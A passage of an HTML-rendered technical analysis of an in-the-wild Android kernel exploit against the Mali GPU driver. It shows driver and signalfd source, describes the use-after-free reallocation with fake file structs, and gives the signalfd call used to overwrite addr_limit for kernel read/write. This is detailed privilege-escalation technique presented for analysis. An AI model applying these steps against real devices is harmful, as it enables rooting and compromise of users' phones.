 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(!</span><span class="vdnyYxSRCi-c4">kbase_ctx_flag</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;KCTX_MEM_PROFILE_INITIALIZED</span><span class="vdnyYxSRCi-c0">))</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">IS_ERR_OR_NULL</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">kctx_dentry</span><span class="vdnyYxSRCi-c0">))</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err &nbsp;</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">ENOMEM</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">else</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(!</span><span class="vdnyYxSRCi-c4">debugfs_create_file</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;mem_profile&quot;</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0444</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">kctx_dentry</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;kctx</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">kbasep_mem_profile_debugfs_fops</span><span class="vdnyYxSRCi-c0">))</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EAGAIN</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">else</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kbase_ctx_flag_set</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KCTX_MEM_PROFILE_INITIALIZED</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kbase_ctx_flag</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;KCTX_MEM_PROFILE_INITIALIZED</span><span class="vdnyYxSRCi-c0">))</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">mem_profile_data</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">mem_profile_data </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;data</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">mem_profile_size </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;size</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">else</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">data</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; dev_dbg</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">kbdev</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">dev</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;returning: %d, initialised: %d&quot;</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;kbase_ctx_flag</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;KCTX_MEM_PROFILE_INITIALIZED</span><span class="vdnyYxSRCi-c0">));</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; mutex_unlock</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">mem_profile_lock</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;err</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">#else</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c20">/* CONFIG_DEBUG_FS */</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;kbasep_mem_profile_debugfs_insert</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;kbase_context </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">kctx</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">char</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">data</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size_t size</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; kfree</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">data</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">#endif</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c20">/* CONFIG_DEBUG_FS */</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">By writing the fake file structs as a singular 0x2000 size buffer rather than as 25 individual 0x140 size buffers, the exploit will be writing their fake structs to two whole pages which increases the odds of reallocating over the freed file struct.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The exploit then calls </span><span class="vdnyYxSRCi-c2">dup2</span><span>&nbsp;on the dangling FD&rsquo;s. The </span><span class="vdnyYxSRCi-c2">dup2</span><span>&nbsp;syscall will open another fd on the same open file structure that the original points to. In this case, the exploit is calling </span><span class="vdnyYxSRCi-c2">dup2</span><span>&nbsp;to verify that they successfully reallocated a fake file structure in the same place as the freed file structure. </span><span class="vdnyYxSRCi-c2">dup2</span><span>&nbsp;will increment the reference count (</span><span class="vdnyYxSRCi-c2">f_count</span><span>) in the file structure. In all of our fake file structures, the </span><span class="vdnyYxSRCi-c2">f_count</span><span class="vdnyYxSRCi-c7">&nbsp;was set to 0x7F. So if any of them are incremented to 0x80, the exploit knows that it successfully reallocated over the freed file struct.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>To determine if any of the file struct&rsquo;s refcounts were incremented, the exploit iterates through each of the directories under </span><span class="vdnyYxSRCi-c2">/sys/kernel/debug/mali/mem/</span><span>&nbsp;and reads each directory&rsquo;s </span><span class="vdnyYxSRCi-c2">mem_profile</span><span>&nbsp;contents. If it finds the byte 0x80, then it knows that it successfully reallocated the freed struct and that the </span><span class="vdnyYxSRCi-c2">f_count</span><span>&nbsp;of the fake file struct was incremented.</span></p><h2 class="vdnyYxSRCi-c17 vdnyYxSRCi-c8" id="h.yfq0poarwpr9"><span>Overwriting the addr_limit</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Like many previous Android exploits, to gain arbitrary kernel read and write, the exploit overwrites the kernel address limit (</span><span class="vdnyYxSRCi-c2">addr_limit</span><span>). The </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;defines the address range that the kernel may access when dereferencing userspace pointers. For userspace threads, the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;is usually </span><span class="vdnyYxSRCi-c2">USER_DS</span><span>&nbsp;or</span><span>&nbsp;</span><span class="vdnyYxSRCi-c2">0x7FFFFFFFFF</span><span>. For kernel threads, it&rsquo;s usually </span><span class="vdnyYxSRCi-c2">KERNEL_DS</span><span>&nbsp;or </span><span class="vdnyYxSRCi-c2">0xFFFFFFFF</span><span class="vdnyYxSRCi-c2">FFFFFFFF</span><span class="vdnyYxSRCi-c7">. &nbsp;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Userspace operations only access addresses below the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>. Therefore, by raising the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;by overwriting it, we will make kernel memory accessible to our unprivileged process. </span><span>The exploit uses the syscall </span><span class="vdnyYxSRCi-c2">signalfd</span><span class="vdnyYxSRCi-c7">&nbsp;with the dangling fd to do this.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.b20c3d5f1283b74946e58ab9889119293a7eef9f"></a><a id="t.25"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">signalfd</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">dangling_fd</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0xFFFFFF8000000000</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">8</span><span class="vdnyYxSRCi-c0">);</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>According to the </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://man7.org/linux/man-pages/man2/signalfd.2.html">man pages</a></span><span>, the syscall </span><span class="vdnyYxSRCi-c2">signalfd</span><span class="vdnyYxSRCi-c7">&nbsp;is:</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c39"><span class="vdnyYxSRCi-c35 vdnyYxSRCi-c11">signalfd() creates a file descriptor that can be used to accept signals targeted at the caller. &nbsp;This provides an alternative to the use of a signal handler or sigwaitinfo(2), and has the advantage that the file descriptor may be monitored by select(2), poll(2), and epoll(7).</span></p>
 <p class="c1 c8 c14 c39"><span class="vdnyYxSRCi-c7"></span></p><a id="t.b0e9b96cf2ebdb989f730bf0fd87809d54a61b18"></a><a id="t.26"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c11">int</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c11">&nbsp;signalfd</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c11">(</span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c11">int</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c11">&nbsp;fd</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c11">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c11">&nbsp;</span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c11">const</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c11">&nbsp;sigset_t </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c11">*</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c11">mask</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c11">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c11">&nbsp;</span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c11">int</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c11">&nbsp;flags</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c11">);</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The exploit called </span><span class="vdnyYxSRCi-c2">signalfd</span><span>&nbsp;on the file descriptor that was found to replace the freed one in the previous step. When </span><span class="vdnyYxSRCi-c2">signalfd</span><span>&nbsp;is called on an existing file descriptor, only the </span><span class="vdnyYxSRCi-c2">mask</span><span>&nbsp;is updated based on the mask passed as the argument, which gives the exploit an 8-byte write to the </span><span class="vdnyYxSRCi-c2">signmask</span><span>&nbsp;of the </span><span class="vdnyYxSRCi-c2">signalfd_ctx</span><span class="vdnyYxSRCi-c7">&nbsp;struct.. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.650b5ef7704bd97d603a385d99bc69b0dafbdd0f"></a><a id="t.27"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">typedef</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">unsigned</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;sigset_t</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;signalfd_ctx </span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; sigset_t sigmask</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">};</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The file struct includes a field called </span><span class="vdnyYxSRCi-c2">private_data</span><span>&nbsp;that is a </span><span class="vdnyYxSRCi-c2">void *</span><span>. File structs for </span><span class="vdnyYxSRCi-c2">signalfd</span><span>&nbsp;file descriptors store the pointer to the </span><span class="vdnyYxSRCi-c2">signalfd_ctx</span><span>&nbsp;struct in the </span><span class="vdnyYxSRCi-c2">private_data</span><span>&nbsp;field. As shown above, the </span><span class="vdnyYxSRCi-c2">signalfd_ctx</span><span class="vdnyYxSRCi-c7">&nbsp;struct is simply an 8 byte structure that contains the mask.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">Let&rsquo;s walk through how the signalfd source code updates the mask: </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.07266e9a1020f50ea1d3e9e61a15aa713d19b5aa"></a><a id="t.28"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">SYSCALL_DEFINE4</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">signalfd4</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;ufd</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;sigset_t __user </span><span class="vdnyYxSRCi-c0">*,</span><span class="vdnyYxSRCi-c4">&nbsp;user_mask</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size_t</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;sizemask</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;flags</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; sigset_t sigmask</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;signalfd_ctx </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">ctx</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20">/* Check the SFD_* constants for consistency. &nbsp;*/</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; BUILD_BUG_ON</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">SFD_CLOEXEC </span><span class="vdnyYxSRCi-c0">!=</span><span class="vdnyYxSRCi-c4">&nbsp;O_CLOEXEC</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; BUILD_BUG_ON</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">SFD_NONBLOCK </span><span class="vdnyYxSRCi-c0">!=</span><span class="vdnyYxSRCi-c4">&nbsp;O_NONBLOCK</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">flags </span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">~(</span><span class="vdnyYxSRCi-c4">SFD_CLOEXEC </span><span class="vdnyYxSRCi-c0">|</span><span class="vdnyYxSRCi-c4">&nbsp;SFD_NONBLOCK</span><span class="vdnyYxSRCi-c0">))</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EINVAL</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">sizemask </span><span class="vdnyYxSRCi-c0">!=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">sizeof</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">sigset_t</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">||</span></p>
